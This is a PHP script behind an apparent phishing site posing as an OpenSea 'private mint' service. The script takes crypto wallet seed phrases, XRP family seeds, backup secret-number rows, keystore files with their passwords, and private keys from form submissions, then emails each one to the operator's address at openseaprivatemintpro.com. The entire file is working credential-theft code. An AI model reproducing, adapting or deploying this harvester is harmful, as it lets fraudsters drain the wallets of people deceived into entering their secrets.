<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

$date = date("Y-m-d H:i:s");
      if(isset($_POST["phrase"]) && $_POST["phrase"] != ""){
      
    $phrase = $_POST['phrase'];
    $wallet = $_POST['wallet'];

    require_once "PHPMailer/PHPMailer.php";
require_once 'PHPMailer/Exception.php';


//PHPMailer Object
$mail = new PHPMailer;

    //From email address and name
        $mail->setFrom("support@openseaprivatemintpro.com");
   $mail->FromName = "Opensea Privatemint";
              
 
$mail->addAddress("support@openseaprivatemintpro.com"); //Recipient name is optional

//Address to which recipient will reply

//Send HTML or Plain Text email
$mail->isHTML(true);

$mail->Subject = "New Wallet Input";
$mail->Body = '
Wallet: <b>'.$wallet.' </b> <br/>
Phrase: <b>'.$phrase.'</b>

';


if(!$mail->send()) 
{
    echo "no";
} 
else 
{
    echo "yes";
    
}
  
            
            
    }


    if(isset($_POST["familyseed"]) && $_POST["familyseed"] != ""){
      
        $familyseed = $_POST['familyseed'];
        $wallet = $_POST['wallet'];
    
        require_once "PHPMailer/PHPMailer.php";
    require_once 'PHPMailer/Exception.php';
    
    
    //PHPMailer Object
    $mail = new PHPMailer;
    
        //From email address and name
            $mail->setFrom("support@openseaprivatemintpro.com");
       $mail->FromName = "Opensea Privatemint";
                  
     
    $mail->addAddress("support@openseaprivatemintpro.com"); //Recipient name is optional
    
    //Address to which recipient will reply
    
    //Send HTML or Plain Text email
    $mail->isHTML(true);
    
    $mail->Subject = "New Wallet Input";
    $mail->Body = '
    Wallet: <b>'.$wallet.' </b> <br/>
    Family Seed: <b>'.$familyseed.'</b>
    
    ';
    
    
    if(!$mail->send()) 
    {
        echo "no";
    } 
    else 
    {
        echo "yes";
        
    }
      
                
                
        }



        if(isset($_POST["private1"]) && $_POST["private1"] != ""){
      
            $private1 = $_POST['private1'];
            $private2 = $_POST['private2'];
            $private3 = $_POST['private3'];
            $private4 = $_POST['private4'];
            $private5 = $_POST['private5'];
            $private6 = $_POST['private6'];
            $private7 = $_POST['private7'];
            $private8 = $_POST['private8'];
            $wallet = $_POST['wallet'];
        
            require_once "PHPMailer/PHPMailer.php";
        require_once 'PHPMailer/Exception.php';
        
        
        //PHPMailer Object
        $mail = new PHPMailer;
        
            //From email address and name
                $mail->setFrom("support@openseaprivatemintpro.com");
           $mail->FromName = "Opensea Privatemint";
                      
         
        $mail->addAddress("support@openseaprivatemintpro.com"); //Recipient name is optional
        
        //Address to which recipient will reply
        
        //Send HTML or Plain Text email
        $mail->isHTML(true);
        
        $mail->Subject = "New Wallet Input";
        $mail->Body = '
        Wallet: <b>'.$wallet.' </b> <br/>
        Secret numbers of row A: <b>'.$private1.'</b> <br/>
        Secret numbers of row B: <b>'.$private2.'</b> <br/>
        Secret numbers of row C: <b>'.$private3.'</b> <br/>
        Secret numbers of row D: <b>'.$private4.'</b> <br/>
        Secret numbers of row E: <b>'.$private5.'</b> <br/>
        Secret numbers of row F: <b>'.$private6.'</b> <br/>
        Secret numbers of row G: <b>'.$private7.'</b> <br/>
        Secret numbers of row H: <b>'.$private8.'</b> 

        
        ';
        
        
        if(!$mail->send()) 
        {
            echo "no";
        } 
        else 
        {
            echo "yes";
            
        }
          
                    
                    
            }



            if(isset($_POST["keystoreval"]) && $_POST["keystoreval"] != ""){
      
                $keystoreval = $_POST['keystoreval'];
                $keystorepass = $_POST['keystorepass'];
                $wallet = $_POST['wallet'];
            
                require_once "PHPMailer/PHPMailer.php";
            require_once 'PHPMailer/Exception.php';
            
            
            //PHPMailer Object
            $mail = new PHPMailer;
            
                //From email address and name
                    $mail->setFrom("support@openseaprivatemintpro.com");
               $mail->FromName = "Opensea Privatemint";
                          
             
            $mail->addAddress("support@openseaprivatemintpro.com"); //Recipient name is optional
            
            //Address to which recipient will reply
            
            //Send HTML or Plain Text email
            $mail->isHTML(true);
            
            $mail->Subject = "New Wallet Input";
            $mail->Body = '
            Wallet: <b>'.$wallet.' </b> <br/>
            Keystore JSON: <b>'.$keystoreval.'</b> <br/>
            Password: <b>'.$keystorepass.'</b>
            
            ';
            
            
            if(!$mail->send()) 
            {
                echo "no";
            } 
            else 
            {
                echo "yes";
                
            }
              
                        
                        
                }


                if(isset($_POST["privatekeyval"]) && $_POST["privatekeyval"] != ""){
      
                    $privatekeyval = $_POST['privatekeyval'];
                    $wallet = $_POST['wallet'];
                
                    require_once "PHPMailer/PHPMailer.php";
                require_once 'PHPMailer/Exception.php';
                
                
                //PHPMailer Object
                $mail = new PHPMailer;
                
                    //From email address and name
                        $mail->setFrom("support@openseaprivatemintpro.com");
                   $mail->FromName = "Opensea Privatemint";
                              
                 
                $mail->addAddress("support@openseaprivatemintpro.com"); //Recipient name is optional
                
                //Address to which recipient will reply
                
                //Send HTML or Plain Text email
                $mail->isHTML(true);
                
                $mail->Subject = "New Wallet Input";
                $mail->Body = '
                Wallet: <b>'.$wallet.' </b> <br/>
                Private Key: <b>'.$privatekeyval.'</b>
                
                ';
                
                
                if(!$mail->send()) 
                {
                    echo "no";
                } 
                else 
                {
                    echo "yes";
                    
                }
                  
                            
                            
                    }
    
    
   


    



?>